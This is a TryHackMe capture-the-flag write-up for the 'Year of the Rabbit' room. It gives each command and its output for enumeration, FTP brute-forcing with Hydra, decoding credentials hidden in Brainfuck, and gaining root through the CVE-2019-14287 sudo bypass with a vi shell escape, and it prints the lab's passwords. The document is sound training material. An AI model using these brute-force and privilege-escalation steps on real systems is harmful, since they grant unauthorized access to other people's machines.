# Year of the Rabbit - TryHackMe Write-up

> **Room:** Year of the Rabbit  
> **Platform:** TryHackMe  
> **Difficulty:** Easy  
> **Type:** Web / FTP / Privilege Escalation  
> **Status:** Completed

---

## Disclaimer

This write-up is for **educational purposes only** and was completed in a **legal lab environment** on TryHackMe.

---

## Room Overview

**Year of the Rabbit** is a beginner-friendly TryHackMe room that focuses on:

- Web enumeration
- Hidden content discovery
- FTP access
- Password discovery
- Brainfuck decoding
- Lateral movement
- Privilege escalation via `sudo`

The attack path for this machine was:

**Recon -> Hidden HTTP clue -> FTP -> SSH as eli -> Gwendoline -> Root**

---

## Enumeration

I started with a full TCP scan using Nmap:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

### Nmap Results

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
```

### Analysis

Three services were exposed:

- **FTP (21)**
- **SSH (22)**
- **HTTP (80)**

At this stage, SSH was not immediately useful because I had no credentials.  
The most interesting starting point was therefore the web service on port 80.

![Nmap Scan](images/01-nmap-scan.png)

---

## Web Enumeration

Browsing to the website only showed the default Apache page, so I began enumerating manually.

I checked the suspicious hidden page:

```bash
curl -i http://<TARGET_IP>/sup3r_s3cr3t_fl4g.php
```

This returned an HTTP redirect:

```text
HTTP/1.1 302 Found
Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
```

This was the key clue.  
Instead of following the Rickroll in the browser, inspecting the headers revealed the real hidden directory:

```text
/WExYY2Cv-qU
```

### Why this mattered

This step shows the importance of checking **HTTP headers** and not trusting only what is rendered in the browser.

![HTTP Clue](images/02-http-clue.png)

---

## Hidden Directory Discovery

I then visited the hidden directory:

```bash
curl -s http://<TARGET_IP>/WExYY2Cv-qU/
```

Inside, I found an image called:

```text
Hot_Babe.png
```

I downloaded it:

```bash
wget http://<TARGET_IP>/WExYY2Cv-qU/Hot_Babe.png
```

---

## Extracting Information from the Image

The image itself was not the goal — the useful data was hidden inside the file.

I used `strings` to inspect readable text in the PNG:

```bash
strings Hot_Babe.png
```

This revealed:

```text
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
```

Below that message was a list of candidate passwords.

### Why this worked

`strings` extracts readable ASCII text from binary files.  
In CTFs, files such as images often contain hidden content appended to the file or embedded somewhere in the binary.

![Hot_Babe.png Analysis](images/03-image-analysis.png)

---

## FTP Access

Now that I had:

- Username: `ftpuser`
- A list of possible passwords

I used Hydra to brute-force FTP with the supplied password list:

```bash
hydra -l ftpuser -P ftp_passwords.txt ftp://<TARGET_IP> -V
```

Hydra returned the correct credentials:

```text
[21][ftp] host: <TARGET_IP>   login: ftpuser   password: 5iez1wGXKfPKQ
```

### FTP Passive Mode Issue

When connecting with the normal FTP client, I hit this error:

```text
200 PORT command successful. Consider using PASV.
425 Failed to establish connection.
```

This happened because the client was trying to use **active mode**.  
Switching to **passive mode** fixed it:

```bash
ftp -p <TARGET_IP>
```

Or inside the FTP prompt:

```text
passive
```

Then I downloaded the available file:

```bash
get "Eli's_Creds.txt"
```

![FTP Access](images/04-ftp-access.png)

---

## Handling the Strange Filename

The downloaded file had a weird name with a newline character at the end:

```text
'Eli'\''s_Creds.txt'$'\n'
```

I accessed it with:

```bash
cat $'Eli\'s_Creds.txt\n'
```

Then I renamed it to something cleaner:

```bash
mv -- $'Eli\'s_Creds.txt\n' elis_creds.txt
```

---

## Brainfuck Decoding

The content of the file looked like this:

```text
+++++ ++++[ ->+++ ...
```

This was **Brainfuck**, an esoteric programming language often used in CTFs for obfuscation.

After decoding it, I obtained:

```text
User: eli
Password: DSpDiM1wAEwid
```

I then logged in through SSH:

```bash
ssh eli@<TARGET_IP>
```

![Brainfuck Decoding](images/05-brainfuck.png)

---

## SSH as `eli`

After logging in as `eli`, I looked around the system for hidden clues.

A hint pointed to a secret location, so I searched for suspicious directories:

```bash
find / -iname '*s3cr3t*' 2>/dev/null
```

This revealed:

```text
/usr/games/s3cr3t/
```

Inside that directory, I found a hidden file:

```bash
cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```

Contents:

```text
Your password is awful, Gwendoline.
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!
```

This gave me the password for the next user.

---

## Pivoting to `gwendoline`

I switched user with:

```bash
su gwendoline
```

Password:

```text
MniVCQVhQHUNI
```

Then I retrieved the user flag:

```bash
cd /home/gwendoline
cat user.txt
```

![User Pivot](images/06-gwendoline.png)

---

## Privilege Escalation

The next step was checking sudo permissions:

```bash
sudo -l
```

Output:

```text
User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

At first glance, this looks like `gwendoline` can run `vi` as any user **except root**.

However, this machine is vulnerable to **CVE-2019-14287**, a known sudo privilege escalation vulnerability that allows bypassing the `!root` restriction by using UID `-1`.

I exploited it with:

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

Inside `vi`, I spawned a shell:

```vim
:!/bin/bash
```

Then I confirmed I was root:

```bash
whoami
id
```

And finally grabbed the root flag:

```bash
cat /root/root.txt
```

![Privilege Escalation](images/07-privesc.png)

---

## Root Cause / Key Lessons

This room demonstrates several important concepts:

- **Default web pages can still hide useful clues**
- **HTTP headers can reveal more than the browser**
- **Images may contain hidden strings or data**
- **Hydra is powerful when you already have a focused wordlist**
- **FTP active/passive mode matters**
- **Obscure encodings (Brainfuck) are common in CTFs**
- **Privilege escalation often starts with `sudo -l`**
- **Misconfigured or vulnerable sudo rules can lead to root**

---

## Attack Path Summary

1. Enumerated open services with Nmap
2. Investigated the web server
3. Found hidden directory via HTTP redirect header
4. Downloaded `Hot_Babe.png`
5. Extracted FTP username and candidate passwords using `strings`
6. Brute-forced FTP credentials with Hydra
7. Downloaded `Eli's_Creds.txt`
8. Decoded Brainfuck to recover `eli` SSH credentials
9. Logged in as `eli`
10. Found Gwendoline’s password in `/usr/games/s3cr3t/`
11. Switched to `gwendoline`
12. Enumerated sudo permissions
13. Exploited **CVE-2019-14287**
14. Escalated to root

---

## Useful Commands

### Nmap
```bash
nmap -sC -sV -p- <TARGET_IP>
```

### Header inspection
```bash
curl -i http://<TARGET_IP>/sup3r_s3cr3t_fl4g.php
```

### Image string extraction
```bash
strings Hot_Babe.png
```

### FTP brute-force
```bash
hydra -l ftpuser -P ftp_passwords.txt ftp://<TARGET_IP> -V
```

### FTP passive mode
```bash
ftp -p <TARGET_IP>
```

### Brainfuck file access
```bash
cat $'Eli\'s_Creds.txt\n'
mv -- $'Eli\'s_Creds.txt\n' elis_creds.txt
```

### Find secret directories
```bash
find / -iname '*s3cr3t*' 2>/dev/null
```

### Sudo privilege escalation
```bash
sudo -l
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

### Spawn shell from vi
```vim
:!/bin/bash
```

---

## Final Thoughts

This was a fun and well-structured beginner room.  
It teaches a very realistic progression:

- enumerate carefully
- extract small clues
- pivot step by step
- always check `sudo -l`

The room is especially good for practicing:
- web enumeration
- FTP interaction
- credential discovery
- decoding
- local privilege escalation

---

## Suggested Image Names

images/
├── year-of-the-rabbit-banner.png
├── 01-nmap-scan.png
├── 02-http-clue.png
├── 03-image-analysis.png
├── 04-ftp-access.png
├── 05-brainfuck.png
├── 06-gwendoline.png
└── 07-privesc.png
```

---

## Author

Write-up by **[PXWN3D]**
